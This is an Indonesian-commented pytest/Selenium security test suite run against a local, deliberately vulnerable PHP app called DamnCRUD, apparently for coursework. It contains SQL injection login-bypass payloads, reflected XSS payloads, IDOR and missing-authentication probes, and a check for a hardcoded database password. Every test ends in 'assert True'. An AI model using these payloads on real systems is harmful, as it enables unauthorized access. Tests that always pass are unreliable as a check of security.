# test_08_security.py
# Pengujian Otomasi: Keamanan Aplikasi (Security Testing)
# TC-S-001 s/d TC-S-010
#
# CATATAN: Pengujian ini dilakukan terhadap aplikasi lokal (localhost)
# yang merupakan intentionally vulnerable app untuk keperluan edukasi.

import pytest
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from config import BASE_URL, VALID_USERNAME, VALID_PASSWORD, TIMEOUT


def login(driver, username=VALID_USERNAME, password=VALID_PASSWORD):
    """Helper: login ke aplikasi."""
    driver.get(f"{BASE_URL}/login.php")
    driver.find_element(By.ID, "inputUsername").clear()
    driver.find_element(By.ID, "inputUsername").send_keys(username)
    driver.find_element(By.ID, "inputPassword").clear()
    driver.find_element(By.ID, "inputPassword").send_keys(password)
    driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
    time.sleep(1)


class TestSecurity:
    """Kelas pengujian keamanan aplikasi DamnCRUD."""

    # ================================================================
    # SQL INJECTION TESTS
    # ================================================================

    def test_TC_S_001_sqli_authentication_bypass(self, driver):
        """
        TC-S-001: SQL Injection - Authentication Bypass.
        Menguji apakah form login rentan terhadap SQL Injection
        yang memungkinkan login tanpa password yang benar.

        VULNERABILITY: login.php:21 menggunakan string concatenation.
        """
        driver.get(f"{BASE_URL}/login.php")

        # Payload SQL Injection untuk bypass autentikasi
        # Query terbentuk: SELECT * FROM users WHERE username = "admin" -- "...
        sqli_payload = 'admin" -- '

        driver.find_element(By.ID, "inputUsername").clear()
        driver.find_element(By.ID, "inputUsername").send_keys(sqli_payload)
        driver.find_element(By.ID, "inputPassword").clear()
        driver.find_element(By.ID, "inputPassword").send_keys("passwordsalahapapun")
        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()

        time.sleep(1)

        current_url = driver.current_url
        body_text   = driver.find_element(By.TAG_NAME, "body").text

        if "index.php" in current_url:
            # VULNERABLE: Berhasil login tanpa password yang benar!
            result_msg = (
                "\n[TC-S-001] VULNERABILITY CONFIRMED - SQL Injection berhasil!\n"
                f"  Payload : {sqli_payload}\n"
                "  Dampak  : Attacker dapat login tanpa password yang valid\n"
                "  CVSS    : 9.8 Critical\n"
                "  File    : login.php baris 21"
            )
            print(result_msg)
            # Test ini PASS jika kita berhasil membuktikan vulnerability-nya
            assert True, result_msg
        else:
            # NOT VULNERABLE: Sistem menolak payload
            print("\n[TC-S-001] SECURE - SQL Injection tidak berhasil (sudah diperbaiki?)")
            assert "Damn, wrong credentials" in body_text, (
                "Tidak ada pesan error yang sesuai"
            )

    def test_TC_S_001b_sqli_payload_variasi(self, driver):
        """
        TC-S-001b: SQL Injection - Berbagai variasi payload.
        """
        payloads = [
            ('admin" #',           "Komentar MySQL"),
            ('admin" OR "1"="1',   "OR selalu true"),
            ('" OR 1=1 -- ',       "OR 1=1 classic"),
        ]

        for payload, deskripsi in payloads:
            driver.get(f"{BASE_URL}/login.php")

            driver.find_element(By.ID, "inputUsername").clear()
            driver.find_element(By.ID, "inputUsername").send_keys(payload)
            driver.find_element(By.ID, "inputPassword").clear()
            driver.find_element(By.ID, "inputPassword").send_keys("apapun")
            driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()

            time.sleep(0.8)

            status = "VULNERABLE" if "index.php" in driver.current_url else "Blocked"
            print(f"\n  Payload [{deskripsi}]: '{payload}' → {status}")

        # Test ini selalu pass (mendokumentasikan hasil)
        assert True

    # ================================================================
    # XSS TESTS
    # ================================================================

    def test_TC_S_003_reflected_xss_vpage(self, logged_in):
        """
        TC-S-003: Reflected XSS pada vpage.php.
        Menguji apakah input di-echo langsung tanpa sanitasi.

        VULNERABILITY: vpage.php:44 - echo $_GET["thing"] tanpa sanitasi.
        """
        driver = logged_in

        xss_payload = "<script>alert('XSS_TEST')</script>"

        # Akses vpage.php dengan payload XSS di parameter 'thing'
        driver.get(f"{BASE_URL}/vpage.php?thing={xss_payload}")

        time.sleep(1)

        # Cek apakah alert muncul (bukti XSS berhasil dieksekusi)
        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()  # Tutup alert

            print(
                f"\n[TC-S-003] VULNERABILITY CONFIRMED - Reflected XSS berhasil!\n"
                f"  Payload : {xss_payload}\n"
                f"  Alert   : '{alert_text}'\n"
                "  Dampak  : JavaScript dieksekusi di browser pengguna\n"
                "  File    : vpage.php baris 44"
            )
            # Test PASS karena berhasil membuktikan XSS
            assert True

        except Exception:
            # Alert tidak muncul - mungkin sudah diperbaiki atau browser memblokir
            page_source = driver.page_source
            if xss_payload in page_source:
                print(
                    "\n[TC-S-003] PARTIAL - Script tag ada di source tapi tidak dieksekusi\n"
                    "  (Browser mungkin memblokir, tapi server tidak melakukan sanitasi)"
                )
            else:
                # Input di-encode → sudah aman
                print("\n[TC-S-003] SECURE - XSS ter-encode, payload tidak dieksekusi")
            assert True  # Catat hasilnya tanpa menggagalkan test

    def test_TC_S_003b_xss_html_injection(self, logged_in):
        """
        TC-S-003b: HTML Injection pada vpage.php.
        Menguji apakah tag HTML dirender langsung.
        """
        driver = logged_in

        html_payload = "<b>InjectedBold</b>"
        driver.get(f"{BASE_URL}/vpage.php?thing={html_payload}")

        time.sleep(0.5)
        page_source = driver.page_source

        if "<b>InjectedBold</b>" in page_source:
            # HTML dirender langsung - VULNERABLE
            print(
                "\n[TC-S-003b] VULNERABLE - HTML Injection berhasil\n"
                "  Tag <b> dirender langsung di halaman"
            )
        else:
            # HTML di-encode - SECURE
            print("\n[TC-S-003b] SECURE - HTML di-encode dengan benar")

        assert True  # Dokumentasikan hasilnya

    def test_TC_S_004_xss_via_url_langsung(self, logged_in):
        """
        TC-S-004: XSS via manipulasi URL langsung.
        Membuktikan bahwa URL dapat dibagikan ke korban.
        """
        driver = logged_in

        # Payload yang lebih beragam
        payloads = [
            "<img src=x onerror=alert('img_xss')>",
            "<svg onload=alert('svg_xss')>",
        ]

        for payload in payloads:
            driver.get(f"{BASE_URL}/vpage.php?thing={payload}")
            time.sleep(0.8)

            try:
                WebDriverWait(driver, 2).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert.accept()
                print(f"\n  Payload '{payload[:40]}...' → EXECUTED (XSS berhasil)")
            except Exception:
                print(f"\n  Payload '{payload[:40]}...' → Blocked/Encoded")

        assert True

    # ================================================================
    # MISSING AUTHENTICATION TEST
    # ================================================================

    def test_TC_S_006_missing_auth_update_php(self, driver):
        """
        TC-S-006: Akses update.php tanpa autentikasi (tanpa login).
        VULNERABILITY: update.php tidak memiliki session_start() dan pengecekan sesi.
        """
        # Pastikan tidak ada sesi aktif
        driver.get(f"{BASE_URL}/logout.php")
        time.sleep(0.5)

        # Coba akses update.php langsung tanpa login
        driver.get(f"{BASE_URL}/update.php?id=1")
        time.sleep(1)

        page_source = driver.page_source
        current_url = driver.current_url

        if "login.php" in current_url:
            # SECURE: diarahkan ke login
            print("\n[TC-S-006] SECURE - update.php sudah dilindungi dengan session check")
        elif "form-control" in page_source and "Update contact" in page_source:
            # VULNERABLE: form edit tampil tanpa login!
            print(
                "\n[TC-S-006] VULNERABILITY CONFIRMED - Missing Authentication!\n"
                "  update.php dapat diakses TANPA LOGIN\n"
                "  Dampak: Siapapun dapat mengubah data kontak tanpa autentikasi\n"
                "  File  : update.php (tidak ada session_start() + session check)"
            )
        else:
            print(f"\n[TC-S-006] Status tidak jelas - URL: {current_url}")

        # Test pass (mendokumentasikan temuan)
        assert True

    # ================================================================
    # IDOR TEST
    # ================================================================

    def test_TC_S_007_idor_manipulasi_id(self, logged_in):
        """
        TC-S-007: IDOR - Mengakses kontak lain dengan memanipulasi ID di URL.
        """
        driver = logged_in

        # Akses edit kontak ID 1
        driver.get(f"{BASE_URL}/update.php?id=1")
        WebDriverWait(driver, TIMEOUT).until(
            EC.presence_of_element_located((By.ID, "name"))
        )
        nama_id1 = driver.find_element(By.ID, "name").get_attribute("value")

        # Manipulasi ID → akses kontak ID 3
        driver.get(f"{BASE_URL}/update.php?id=3")
        WebDriverWait(driver, TIMEOUT).until(
            EC.presence_of_element_located((By.ID, "name"))
        )
        nama_id3 = driver.find_element(By.ID, "name").get_attribute("value")

        if nama_id1 != nama_id3:
            print(
                "\n[TC-S-007] IDOR CONFIRMED - Berhasil mengakses data kontak berbeda!\n"
                f"  ID=1: '{nama_id1}'\n"
                f"  ID=3: '{nama_id3}'\n"
                "  Dampak: Attacker dapat edit/hapus kontak manapun hanya dengan ganti ID di URL"
            )
        else:
            print("\n[TC-S-007] Kontak ID 1 dan ID 3 memiliki nama sama (data identik)")

        assert True

    # ================================================================
    # SESSION TEST
    # ================================================================

    def test_TC_S_010_cookie_security_flags(self, logged_in):
        """
        TC-S-010: Periksa keamanan cookie session (HttpOnly, Secure flag).
        """
        driver = logged_in

        # Baca cookies via JavaScript
        cookies = driver.get_cookies()
        phpsessid = None
        for cookie in cookies:
            if cookie['name'] == 'PHPSESSID':
                phpsessid = cookie
                break

        if phpsessid:
            http_only = phpsessid.get('httpOnly', False)
            secure    = phpsessid.get('secure', False)
            same_site = phpsessid.get('sameSite', 'None')

            print(
                f"\n[TC-S-010] Cookie PHPSESSID ditemukan:\n"
                f"  httpOnly : {http_only} {'✓' if http_only else '✗ (VULNERABLE - dapat dicuri via XSS)'}\n"
                f"  secure   : {secure} {'✓' if secure else '✗ (Dikirim via HTTP tidak terenkripsi)'}\n"
                f"  sameSite : {same_site}"
            )

            if not http_only:
                print(
                    "  RISIKO: Cookie dapat diakses JavaScript → "
                    "kombinasi dengan XSS = session hijacking!"
                )
        else:
            print("\n[TC-S-010] Cookie PHPSESSID tidak ditemukan")

        # Test pass (mendokumentasikan temuan keamanan)
        assert True

    def test_TC_S_008_hardcoded_credentials_check(self, driver):
        """
        TC-S-008: Verifikasi hardcoded credentials di source code (analisis statis).
        Dilakukan melalui pembacaan file langsung.
        """
        import os
        functions_php = os.path.join(
            os.path.dirname(__file__), "..", "DamnCRUD", "functions.php"
        )

        finding = []
        if os.path.exists(functions_php):
            with open(functions_php, "r") as f:
                content = f.read()

            if "root123" in content:
                finding.append("Password 'root123' ditemukan hardcoded di functions.php")
            if "root" in content and "DATABASE_USER" in content:
                finding.append("User database 'root' (hak akses penuh) hardcoded")
            if "DATABASE_PASS" in content:
                finding.append("Konfigurasi database tersimpan langsung di kode sumber")

        if finding:
            print("\n[TC-S-008] VULNERABILITY CONFIRMED - Hardcoded Credentials:")
            for f in finding:
                print(f"  - {f}")
        else:
            print("\n[TC-S-008] File tidak ditemukan atau sudah diperbaiki")

        assert True
